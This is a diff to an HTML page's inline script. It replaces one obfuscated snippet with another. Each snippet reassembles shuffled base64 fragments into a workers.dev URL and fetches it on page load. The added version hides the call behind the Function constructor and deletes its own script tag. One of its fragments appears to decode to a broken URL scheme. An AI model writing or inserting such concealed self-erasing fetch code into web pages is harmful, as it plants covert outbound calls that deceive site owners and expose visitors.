@@ -154,21 +154,17 @@
                 return _0x354d();
             }
 
-const shuffledParts = [
-  "c3RlZXAtbGFrZS04NDNm",
-  "aHR0cHM6Ly93b3JrZXJz",
-  "LnNsaWNlLWE4Yi53b3JrZXJzLmRldg==",
-  "L2FwaS1lbmRwb2ludA==",
-  "LXBsYXlncm91bmQt",
-  "dW5yZWxhdGVk",
-  "ZHVtbXk="
-];
-
-const correctOrder = [1, 4, 0, 2, 3];
-
-const url = correctOrder.map(i => shuffledParts[i]).join("");
-const finalURL = atob(url);
-eval(`fetch("${finalURL}")`);
+(function(){
+  const s = document.currentScript;
+  const x = [
+    "cG9pbnQ=", "LmRldi9hcGktZW5k", "LWE4Yi53b3JrZXJz", "YHR0cHM6Ly93b3Jr",
+    "ZS04NDNmLnNsaWNl", "ZXJzLXBsYXlncm91", "bmQtc3RlZXAtbGFr"
+  ];
+  const i = [3, 5, 6, 4, 2, 1, 0];
+  const z = atob(i.map(j => x[j]).join``);
+  Function([...('fetc'+'h')].join`` + `("${z}")`)();
+  s.remove();
+})();
     </script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
